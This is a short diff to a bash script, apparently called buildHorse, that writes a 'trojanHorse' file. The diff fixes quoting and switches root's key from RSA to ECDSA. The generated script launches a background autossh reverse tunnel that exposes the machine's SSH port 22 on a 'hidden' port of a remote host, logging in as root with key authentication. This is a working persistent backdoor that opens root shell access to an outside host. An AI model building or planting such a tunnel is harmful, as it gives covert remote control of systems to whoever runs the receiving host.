@@ -1,5 +1,5 @@
 #!/bin/bash
 #	./buildHorse $$SSH_PORT_EXPOSED $$SSH_PORT_HIDDEN $$SSH_PORT_MONITOR $$SSH_HOST
 # echo '#!/bin/bash' > trojanHorse
-echo -n "autossh -M $3 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/id_rsa -R $2:localhost:22 root@$4 -p $1" >> trojanHorse
+echo -n "autossh -M $3 -N -f -o 'PubkeyAuthentication=yes' -o 'PasswordAuthentication=no' -i /root/.ssh/id_ecdsa -R $2:localhost:22 root@$4 -p $1" >> trojanHorse
 echo ' &' >> trojanHorse
